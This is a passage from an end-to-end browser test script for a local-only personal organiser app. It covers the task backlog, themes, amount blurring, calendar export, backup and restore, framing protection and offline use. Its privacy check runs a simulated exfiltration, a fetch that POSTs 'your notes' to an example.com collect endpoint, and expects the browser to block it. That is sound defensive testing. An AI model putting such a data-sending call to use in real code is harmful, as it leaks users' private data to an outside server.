  await page.fill('#task-title', title);
  await page.click(`button:text-is("${priority}")`);
  await page.click('form.card button[type="submit"]:has-text("Save")');
  await page.waitForTimeout(400);
}

// A task saved with no date at all must land here by itself - that is the whole
// premise, and it is what makes the list need no decision at capture time.
const backlogText = await page.textContent('.main');
check('an undated task lands in the backlog on its own', backlogText.includes('Order printer ink'), true);
check(
  'critical sorts above low by default, whatever order they were added in',
  backlogText.indexOf('Book the optician') < backlogText.indexOf('Order printer ink'),
  true,
);
check('and the level is named, not just coloured', backlogText.includes('Critical'), true);
await page.screenshot({ path: `${OUT}/backlog.png`, fullPage: true });

check('under the priority sort, a row does not repeat its heading', await page.locator('.main .badge-critical').count(), 0);
await page.click('button:text-is("A–Z")');
await page.waitForTimeout(400);
const azText = await page.textContent('.main');
check(
  'switching to A–Z reorders the list',
  azText.indexOf('Book the optician') < azText.indexOf('Order printer ink'),
  true,
);

// Reload rather than re-render: the sort is only really remembered if it
// survives the app being closed and reopened, which is how it is actually used.
await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(800);
await page.click('.nav-btn:has-text("Backlog")');
await page.waitForTimeout(400);
check(
  'the chosen sort is still chosen after a reload',
  await page.getAttribute('button:text-is("A–Z")', 'aria-pressed'),
  'true',
);

// Ticking one off should take it out of the list - and still be findable, so it
// does not read as "where did it go?".
await page.click('.item input[type="checkbox"]');
await page.waitForTimeout(500);
const afterTick = await page.textContent('.main');
check('a finished thing leaves the list', afterTick.includes('Book the optician'), false);
check('and the toast offers it back', await page.locator('.toast button:text-is("Undo")').count(), 1);
await page.click('.toast button:text-is("Undo")');
await page.waitForTimeout(400);
check('Undo puts it back in the list', (await page.textContent('.main')).includes('Book the optician'), true);
await page.click('.item input[type="checkbox"]');
await page.waitForTimeout(500);
check('but is still there to be found', afterTick.includes('Show what I have finished'), true);
await page.click('button:has-text("Show what I have finished")');
await page.waitForTimeout(300);
check(
  'and reappears when asked for',
  (await page.textContent('.main')).includes('Book the optician'),
  true,
);

// --- appearance settings really apply ------------------------------------
await page.click('.header button:has-text("Settings")');
await page.waitForTimeout(300);
// :text-is(), not :has-text(). has-text() is a case-insensitive SUBSTRING match,
// so "Dark" would also pick up a "Warm dark" swatch in the custom-theme editor,
// and Playwright would not complain - it would just click the wrong control and
// leave the next step to time out mysteriously. Exact text, every time.
await page.click('button:text-is("Dark")');
await page.waitForTimeout(300);
check('the dark theme applies', await page.getAttribute('html', 'data-theme'), 'dark');
await page.screenshot({ path: `${OUT}/settings-dark.png`, fullPage: true });

// Every theme in the picker must actually apply, not just the two below.
for (const [label, expected] of [
  ['Midnight', 'midnight'],
  ['Amber', 'amber'],
  ['Synthwave', 'synthwave'],
  ['Bubblegum', 'bubblegum'],
  ['Aurora', 'aurora'],
  ['Custom', 'custom'],
]) {
  await page.click(`button:text-is("${label}")`);
  await page.waitForTimeout(200);
  check(`the ${expected} theme applies`, await page.getAttribute('html', 'data-theme'), expected);
}

// The custom theme is assembled in JavaScript rather than by a CSS block, so
// check it really did put tokens on the element, and that they survive a change.
check(
  'a custom theme writes its own tokens',
  await page.evaluate(() => document.documentElement.style.getPropertyValue('--bg').trim().length > 0),
  true,
);
await page.click('button:text-is("True black")');
await page.waitForTimeout(200);
check(
  'and changing the paper changes them',
  await page.evaluate(() => document.documentElement.style.getPropertyValue('--bg').trim()),
  '#07080a',
);
await page.screenshot({ path: `${OUT}/settings-custom.png`, fullPage: true });

await page.click('button:text-is("Calm")');
await page.waitForTimeout(200);
check('and switching back to a CSS theme clears them', await page.evaluate(() => document.documentElement.style.getPropertyValue('--bg')), '');

// --- blurring hides every amount, not just most of them ------------------
// Still on Settings from the theme checks above.
await page.click('text=Blur money amounts until I tap them');
await page.waitForTimeout(200);
/** Dollar figures on screen that are not inside a blurred amount. */
const unblurred = () =>
  page.evaluate(() => {
    const out = [];
    const walker = document.createTreeWalker(document.querySelector('.main'), NodeFilter.SHOW_TEXT);
    for (let node = walker.nextNode(); node; node = walker.nextNode()) {
      if (/\$\s?\d/.test(node.textContent) && !node.parentElement.closest('.amount.blurred')) out.push(node.textContent.trim());
    }
    return out;
  });
await page.click('.nav-btn:has-text("Today")');
await page.waitForTimeout(300);
check('with blur on, Today shows no amount in the clear', (await unblurred()).join(' | '), '');
await page.click('.nav-btn:has-text("Money")');
await page.waitForTimeout(300);
check('with blur on, Money shows no amount in the clear', (await unblurred()).join(' | '), '');
await page.click('.header button:has-text("Settings")');
await page.click('text=Blur money amounts until I tap them');
await page.waitForTimeout(200);

// --- an ended job can be brought back ------------------------------------
await page.click('.nav-btn:has-text("Money")');
await page.click('.card:has-text("Main job") button:text-is("Edit")');
await page.waitForSelector('#income-name');
await page.click('button:text-is("This has ended")');
await page.click('button:text-is("Yes, it has ended")');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check('an ended job is listed under Ended, not lost', await page.locator('section[aria-label="Ended"]').count(), 1);
await page.click('button:has-text("Show 1 ended")');
await page.click('section[aria-label="Ended"] button:text-is("Edit")');
await page.click('button:text-is("It\'s current again")');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check('and made current again from there', (await page.textContent('.main')).includes('Next:'), true);

// --- calendar notes are opt-in, and the switch works ---------------------
await page.click('.header button:has-text("Settings")');
await page.waitForTimeout(200);
check(
  'the export says notes stay out',
  (await page.textContent('.main')).includes('Notes, steps and how to cancel stay here'),
  true,
);
await page.click('text=Put notes, steps and how to cancel into calendar entries');
await page.waitForTimeout(200);
const fullExport = await Promise.all([
  page.waitForEvent('download'),
  page.click('button:has-text("Export everything to my calendar")'),
]).then(([d]) => d);
const fullIcs = await fullExport.createReadStream().then(async (stream) => {
  let out = '';
  for await (const chunk of stream) out += chunk;
  return out.replace(/\r\n /g, '');
});
check('with notes switched on, the cancel steps go in', fullIcs.includes('To cancel: Account'), true);
await page.click('text=Put notes, steps and how to cancel into calendar entries');
await page.waitForTimeout(200);

// --- backup, restore and delete everything --------------------------------
const tableNames = await page.evaluate(
  () =>
    new Promise((resolve) => {
      const req = indexedDB.open('steady');
      req.onsuccess = () => {
        const names = [...req.result.objectStoreNames];
        req.result.close();
        resolve(names);
      };
    }),
);
const dataTables = tableNames.filter((n) => n !== 'settings');
const rowCounts = async () => Object.fromEntries(await Promise.all(dataTables.map(async (n) => [n, (await readStore(n)).length])));
const before = await rowCounts();
check('income is counted on this device', (await page.textContent('.main')).includes('1 income'), true);

const backupDownload = await Promise.all([
  page.waitForEvent('download'),
  page.click('button:has-text("Save a backup file")'),
]).then(([d]) => d);
const backupPath = `${OUT}/e2e-backup.json`;
await backupDownload.saveAs(backupPath);

// Picking a file in replace mode must not wipe anything yet.
await page.click('button:text-is("Wipe and replace")');
await page.setInputFiles('input[type="file"]', backupPath);
await page.waitForTimeout(400);
const preview = await page.textContent('.main');
check('replacing shows what the file holds first', preview.includes('Replace everything on this phone with it?'), true);
check('including the income in it', preview.includes('1 income'), true);
check('and nothing has been touched yet', JSON.stringify(await rowCounts()), JSON.stringify(before));
await page.click('button:has-text("Don\'t restore it")');

await page.click('button:has-text("Delete everything on this device")');
await page.click('button:has-text("Yes, delete all of it")');
await page.waitForTimeout(500);
const afterWipe = await rowCounts();
check(
  'delete everything empties every table, income included',
  Object.entries(afterWipe).filter(([, n]) => n > 0).map(([t]) => t).join(', '),
  '',
);

await page.setInputFiles('input[type="file"]', backupPath);
await page.waitForTimeout(400);
await page.click('button:has-text("Replace everything with this file")');
await page.click('button:has-text("Yes, replace everything")');
await page.waitForTimeout(600);
check('and the backup puts every table back', JSON.stringify(await rowCounts()), JSON.stringify(before));

// --- the privacy claim ---------------------------------------------------
// The whole promise is that this page cannot send your data anywhere. Prove it
// by trying, from inside the page, exactly what a tracker would do.
const exfiltration = await page.evaluate(async () => {
  try {
    await fetch('https://example.com/collect', { method: 'POST', body: 'your notes' });
    return 'LEAKED';
  } catch {
    return 'BLOCKED';
  }
});
check('the browser refuses to let the page phone home', exfiltration, 'BLOCKED');

// --- framed by another page, it shows nothing ------------------------------
// A <meta> CSP cannot forbid framing, and GitHub Pages will not send the
// header, so the app refuses to render inside someone else's page instead.
const framer = await ctx.newPage();
await framer.setContent(`<iframe src="${BASE}" style="width:400px;height:700px"></iframe>`);
await framer.waitForTimeout(2500);
const framed = framer.frames().find((f) => f.url().startsWith(BASE));
check('the app loads inside a frame at all (so the next check means something)', Boolean(framed), true);
check(
  'and renders nothing there',
  framed ? await framed.evaluate(() => document.getElementById('root')?.childElementCount ?? -1) : -1,
  0,
);
await framer.close();

// --- offline -------------------------------------------------------------
// Stop the server outright rather than emulating offline, so this also proves
// the service worker precached everything on the very first visit.
console.log('\n--- stopping the server to test with no network ---');
stopServer();
await new Promise((r) => setTimeout(r, 1500));

await page.reload({ waitUntil: 'domcontentloaded' });
await page.waitForTimeout(2500);
check('the app still renders with no server', await page.evaluate(() => Boolean(document.querySelector('.main'))), true);
check('the whole nav is there', await page.evaluate(() => document.querySelectorAll('.nav-btn').length), 6);
check('the data is still there', (await page.textContent('.main')).includes('Call the dentist'), true);
await page.screenshot({ path: `${OUT}/offline.png`, fullPage: true });

// Across the whole run - every screen, every download, the service worker -
// nothing went anywhere but the app's own server.
check('no request left the app\'s own server', offOrigin.join(' '), '');

// The only console errors we tolerate are our own deliberate exfiltration test.
const unexpected = consoleErrors.filter((e) => !e.includes('example.com'));
check('no unexpected console errors', unexpected.length, 0);
if (unexpected.length) console.log(unexpected.join('\n'));

await browser.close();
stopServer();

console.log(`\nScreenshots in ${OUT}/`);
if (problems.length) {
  console.error(`\n${problems.length} check(s) failed.`);
  process.exit(1);
}
console.log('\nAll checks passed.');
